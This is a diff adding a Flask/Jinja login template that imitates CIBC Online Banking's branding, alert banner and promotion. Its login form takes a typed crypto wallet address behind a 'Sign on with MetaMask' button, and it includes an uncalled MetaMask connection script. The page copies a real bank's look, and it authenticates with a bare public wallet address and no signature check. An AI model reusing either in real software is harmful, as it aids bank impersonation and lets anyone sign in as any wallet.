@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CIBC Online Banking</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 1rem;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .logo {
+            color: #C41F3E;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .search-bar {
+            display: flex;
+            align-items: center;
+            background: #f5f5f5;
+            padding: 0.5rem;
+            border-radius: 20px;
+            border: 1px solid #ccc;
+            width: 250px;
+        }
+
+        .search-bar input {
+            border: none;
+            outline: none;
+            background: transparent;
+            flex: 1;
+            padding: 0.5rem;
+        }
+
+        .search-bar img {
+            width: 20px;
+            height: 20px;
+        }
+
+        .header-icon {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
+
+        .nav {
+            border-bottom: 1px solid #e5e5e5;
+            padding: 1rem;
+        }
+
+        .nav-links {
+            display: flex;
+            justify-content: center; /* Center the navigation links */
+            gap: 2rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: #444;
+            text-decoration: none;
+            font-size: 16px;
+        }
+
+        .alert {
+            background-color: #f0f4f8;
+            padding: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .main-content-wrapper {
+            background: #ffe6e6; /* Light pinkish red */
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 2rem auto;
+            max-width: 1200px;
+        }
+
+        .main-content {
+            display: flex;
+            justify-content: space-between;
+            gap: 2rem;
+        }
+
+        .promo, .login-form {
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            flex: 1;
+        }
+
+        .promo {
+            text-align: center;
+        }
+
+        .special-offer {
+            background: #1D4F91;
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            display: inline-block;
+            font-size: 14px;
+        }
+
+        .login-form h1 {
+            margin-bottom: 1rem;
+            font-size: 24px;
+            color: #444;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #444;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 0.5rem;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .wallet-button {
+            width: 100%;
+            background: #C41F3E;
+            color: white;
+            font-size: 1rem;
+            border: none;
+            padding: 0.75rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+
+        .wallet-button:hover {
+            background: #A61834;
+        }
+
+        .error-message {
+            color: #C41F3E;
+            font-size: 14px;
+            margin-top: 1rem;
+        }
+
+        .security-links {
+            margin-top: 1rem;
+        }
+
+        .security-links a {
+            color: #444;
+            text-decoration: underline;
+            display: block;
+            margin-top: 0.5rem;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">CIBC◊</div>
+        <div class="header-right">
+            <!-- Search Bar -->
+            <div class="search-bar">
+                <input type="text" placeholder="Search">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6d/Magnifying_glass_icon.svg" alt="Search">
+            </div>
+            <!-- Maps Icon -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Google_Maps_icon.svg" alt="Maps" class="header-icon">
+            <!-- Chat Icon -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/34/Chat_icon.svg" alt="Chat" class="header-icon">
+        </div>
+    </header>
+
+    <nav class="nav">
+        <ul class="nav-links">
+            <li><a href="#">Bank Accounts</a></li>
+            <li><a href="#">Credit Cards</a></li>
+            <li><a href="#">Mortgages</a></li>
+            <li><a href="#">Lending</a></li>
+            <li><a href="#">Investments</a></li>
+            <li><a href="#">Insurance</a></li>
+            <li><a href="#">Ways to Bank</a></li>
+            <li><a href="#">Smart Advice</a></li>
+        </ul>
+    </nav>
+
+    <div class="alert">
+        <span>ℹ️</span>
+        <p>As a result of the recent Canada Post service disruption, mail from CIBC will be delayed as service returns to normal. <a href="#">Learn more</a></p>
+    </div>
+
+    <div class="main-content-wrapper">
+        <div class="main-content">
+            <div class="promo">
+                <span class="special-offer">Special bundle offer</span>
+                <h2 style="margin: 1rem 0; font-size: 2rem;">Get up to $600† cash!</h2>
+                <p>Open a CIBC Smart™ Account as your first chequing account, then open your first CIBC eAdvantage® Savings Account and complete all qualifying actions.</p>
+                <p style="font-size: 14px; color: #666; margin: 1rem 0;">Conditions apply.†</p>
+                <a href="#" class="learn-more">Learn more</a>
+            </div>
+
+            <div class="login-form">
+                <h1>Login</h1>
+                {% if error %}
+                    <p class="error-message">{{ error }}</p>
+                {% endif %}
+                <form method="POST" action="{{ url_for('dashboard') }}">
+                    <div class="form-group">
+                        <label for="wallet_address">Wallet Address:</label>
+                        <input type="text" id="wallet_address" name="wallet_address" required>
+                    </div>
+                    <button type="submit" class="wallet-button">Sign on with MetaMask</button>
+                </form>
+                <p id="error-message" class="error-message"></p>
+                <div class="security-links">
+                    <a href="#">🔒 Security guaranteed</a>
+                    <a href="#">Electronic access agreement</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function connectWallet() {
+            const errorMessage = document.getElementById("error-message");
+
+            // Ensure MetaMask is installed
+            if (typeof window.ethereum === "undefined") {
+                errorMessage.textContent = "MetaMask is not installed. Please install it to continue.";
+                console.error("MetaMask is not installed. Visit https://metamask.io to install it.");
+                return;
+            }
+
+            try {
+                // Request account access
+                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+
+                if (!accounts || accounts.length === 0) {
+                    throw new Error("No accounts found. Please ensure your wallet is unlocked.");
+                }
+
+                const walletAddress = accounts[0];
+                console.log("Connected wallet:", walletAddress);
+
+                // Make a POST request to authenticate the wallet
+                const response = await fetch("/auth", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({ wallet_address: walletAddress }),
+                });
+
+                const result = await response.json();
+                if (response.ok) {
+                    console.log("Authentication successful:", result);
+                    window.location.href = "/dashboard"; // Redirect to the dashboard
+                } else {
+                    console.error("Authentication failed:", result);
+                    errorMessage.textContent = result.error || "Failed to authenticate. Please try again.";
+                }
+            } catch (error) {
+                console.error("Error during MetaMask connection:", error);
+                errorMessage.textContent = "An error occurred while connecting to MetaMask. Please try again.";
+            }
+        }
+    </script>
+</body>
+</html>
